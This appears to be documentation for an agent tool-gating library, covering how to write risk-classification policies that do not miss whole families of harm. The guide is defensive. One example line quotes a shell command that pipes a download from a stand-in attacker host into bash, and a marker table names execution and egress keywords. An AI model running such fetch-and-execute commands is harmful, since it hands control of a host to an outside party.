# Writing a policy that holds

The [admission gate](security-context.md) is enforcement. It runs whatever
`ControlPolicy` you hand it, against whatever `Action` you hand it — and it
cannot know that the action you *didn't* classify as risky is the one that
moves money.

So the gate is sound and the policy is the soft part. This page is about the
failure mode that produces, how to find it before production does, and why
reading your own list back is not enough.

## The failure mode: one family of harm at a time

A risk list is written by a person, and a person writes down the harm they
were thinking about. The list comes out internally consistent, passes review,
passes its tests — and says nothing at all about a kind of consequence that
never came to mind.

Three real examples, all from admission gates written for real tool catalogs,
all validated against those catalogs before the gap was found:

| Gate over | The list covered | It was silent on |
|---|---|---|
| A payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |
| A DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** — running a command on a host, uploading a file off it |
| A billing API | **money movement** | **outbound communication** — messaging a customer, scheduling recurring messages |

In each case every entry on the list was correct. In each case the list was a
single semantic family — reversal verbs, destruction verbs, money-movement
verbs — and everything outside that family was classified low-risk and
executed.

The second one is worth sitting with. A gate that held
`Windows.Remediation.Quarantine` let
`SELECT * FROM execve(argv=["bash","-c","curl http://evil.sh | bash"])`
through as a benign read, because no destruction verb appears anywhere in it.

## Why validating against the real catalog does not catch this

The obvious defence is to run your classifier over every tool the target
actually exposes and hand-check the results. Do that — it finds real bugs.

It will not find this one. You score the catalog against a ground truth you
also wrote, from the same mental model that produced the risk list. The
labels agree with the classifier because both encode the same idea of harm.
A 62-case dataset scoring 62/62 is evidence that your classifier matches your
labels, not that your labels cover the harm.

!!! warning "A ground-truth set built from one framing can only find bugs inside that framing."

    The payments example above scored 62/62 on a live-pulled catalog, twice,
    across six rounds of hardening — while creating a charge was low-risk the
    whole time. The dataset's labelling rule scoped risk to money moving
    *out*, so no charge-initiating operation was ever a case in it.

## Check the families, not the list

Rather than re-reading your list, enumerate the ways an action can be
consequential and ask, for each, *which entry covers this?* An empty answer is
the finding.

| Family | The action… | Typical markers |
|---|---|---|
| **Destruction** | removes or overwrites something | delete, wipe, purge, revoke, uninstall |
| **Value out** | moves money or assets away | refund, payout, transfer, chargeback |
| **Value in** | takes payment, or stands up a surface that can | charge, capture, checkout session, payment link, QR code |
| **Execution** | runs caller-supplied code somewhere | exec, shell, script, run, deploy |
| **Egress** | moves data off a system | upload, export, http client, copy, forward |
| **Outbound communication** | reaches a real third party | send, notify, publish, invite, remind |
| **Standing commitment** | schedules future automatic behaviour | subscribe, recurring, auto-\*, cron, retention rule |
| **Identity & access** | changes who can do what | grant, disable user, rotate, add member |
| **Config with blast radius** | changes behaviour for everyone | feature flag, quota, routing rule, webhook target |

The list is a prompt for thought, not a schema. Add rows for your domain — the
point is having *some* enumeration you check against, so a whole family cannot
go missing silently.

For each family, three questions:

1. **Which entry covers it?** No entry means the family is unhandled.
2. **Is there a second path to the same outcome?** An unheld alternative route
   is worth more to an attacker than the route you held. Holding "send the
   invoice" while leaving "generate a scannable payment code for that invoice"
   open holds nothing.
3. **Does the caller control the dangerous part?** A tool that shells out
   internally to read disk usage is a read. A tool that runs a command the
   caller supplies is not, however similar the names look.

## Match on what the caller actually sends

Question 3 has a practical consequence worth stating on its own, because it
decides whether a marker is safe to add at all.

Classify the text the caller submitted, not the implementation behind it. In
one real catalog, 41 artifacts call `execve` inside their own definitions to
collect read-only data — running `df`, running `rpm -qa`. Flagging every tool
that executes *something* would have held all 41 and made the gate unusable.
Matching the submitted request instead means `execve` appears only when the
caller wrote it, which made it both a precise marker and a zero-false-positive
one.

The same reasoning cuts the other way for near-miss names. A marker of
`shell` would flag `Windows.Forensics.Shellbags`, a read-only forensic
artifact. Qualify markers until they name the consequential thing and nothing
else — and where you cannot, prefer the false positive:

!!! tip "Judge a gate by what it lets through, not by what it stops."

    Over-caution costs a confirmation prompt. A miss costs the thing you
    built the gate for. When a marker cannot be tightened without opening a
    real path, leave it broad and write the resulting false positives down
    where the next reader will find them.

## Write the exclusions down

Every classifier has entries it flags that are harmless, and boundaries it
decided not to defend. Those are findings, not embarrassments — an
undocumented exclusion is indistinguishable from an oversight the next time
someone reads the policy.

Say, in the policy module itself:

- which safe things it flags anyway, and why tightening would open a real gap;
- which families it deliberately does not cover;
- which controls it structurally cannot express.

That last one matters more than it looks. Two of the first controls anyone
asks for — *"at most $500 of refunds per day"* and *"five of these per
hour"* — land on opposite sides of the line. Cumulative spend is expressible:
`ControlPolicy(require_verification_score=0, spend_limit_usd=500, require_human_over_usd=100)`
plus a `SpendLedger` (`FileSpendLedger` for one that survives a restart)
holds any single action over $100 for a person and denies one that would take
its scope past $500, and that deny is hard: no approval overrides it.
(`require_verification_score=0` because the default bar holds every call that
arrives without a verdict; see the note below.) Wire it with
`gate_tool(..., action=..., ledger=ledger, spend_scope=...)`. `action` must
set `Action.cost_usd` from the call's arguments, for example
`lambda name, args: Action(name=name, cost_usd=args["amount_usd"])`. The
default action costs nothing, so without it neither dollar rule ever fires and
the ledger stays empty. `spend_scope` may be a callable, so *per day* means
putting the date in the scope key; neither shipped ledger ever expires an
entry. Spend is read before the call and recorded after it, not in one
transaction, so two calls in flight against the same scope can both pass. That
includes parallel tool calls from one agent turn, which run concurrently by
default. Keep one call in flight per scope (for example
`tool_execution="sequential"` on the agent, and one process per scope). A
ledger cannot close the gap by itself: the gate asks it for the total before
the call and reports the cost only after, so it never sees the pending amount.
A rate limit is not expressible:
`ControlPolicy` has no count-per-window rule, so *"five of these per hour"*
still needs state you keep yourself. Naming the boundary is engineering
judgment; letting a reader discover it is not.

## A worked check

```python
from locus.control import Action, ControlPolicy, approve

# One representative call per consequence family; adding a family is cheap.
FAMILY_PROBES = {
    "destruction": Action(name="delete_record", environment="production"),
    "value_out": Action(name="issue_refund", environment="production"),
    "value_in": Action(name="create_charge", environment="production"),
    "execution": Action(name="run_script", environment="production"),
    "egress": Action(name="export_customers", environment="production"),
    "outbound_comms": Action(name="send_invoice", environment="production"),
    "standing_commitment": Action(name="enable_auto_reminders", environment="production"),
    "identity_access": Action(name="disable_user", environment="production"),
}


def uncovered(policy: ControlPolicy, classify, benign: Action) -> list[str]:
    """Families whose probe would be auto-allowed; `classify` maps a call to an `Action`."""
    if not approve(classify(benign.name, {}), policy=policy).allowed:
        raise AssertionError(
            f"{benign.name!r} was held, so this policy holds everything and "
            "the probe below cannot distinguish a covered family from an "
            "uncovered one. Fix the policy or pick a benign probe first."
        )
    return [
        family
        for family, probe in FAMILY_PROBES.items()
        if approve(classify(probe.name, {}), policy=policy).allowed
    ]
```

Against a classifier that matches reversal verbs only — the first failure in
the table above — this returns everything except `destruction` and
`value_out`:

```text
['value_in', 'execution', 'egress', 'outbound_comms',
 'standing_commitment', 'identity_access']
```

Six families, from a two-marker list that its author would have described as
covering "the dangerous operations".

Run it in your test suite, not once by hand. A family that is genuinely out of
scope belongs in an explicit allowlist with a reason next to it — which is the
same discipline as writing the exclusions down, enforced by CI.

!!! note "Why the benign probe is not optional"

    `ControlPolicy()`'s defaults require a verification score of 0.8, so with
    no `VerificationResult` supplied every action is held for a human. Sound
    for a findings-driven security agent; for a tool-gating deployment it
    means the probe above returns `[]` no matter how incomplete your
    classifier is. The guard turns that silent pass into a loud failure.

## The short version

- The gate enforces; your classification decides what it enforces on.
- Re-reading your risk list confirms the list. It cannot reveal the family
  that was never on it.
- A ground-truth dataset inherits the framing of whoever labelled it.
- Enumerate consequence families and check coverage per family.
- Look for second paths to a held outcome.
- Classify what the caller sent, not what the implementation does.
- Prefer the false positive, and write every exclusion down.

## See also

- [The control layer](security-context.md) — how `admit()` and `approve()` fit together
- [GSAR grounding](gsar.md) — the same "prove it, don't assert it" discipline applied to claims
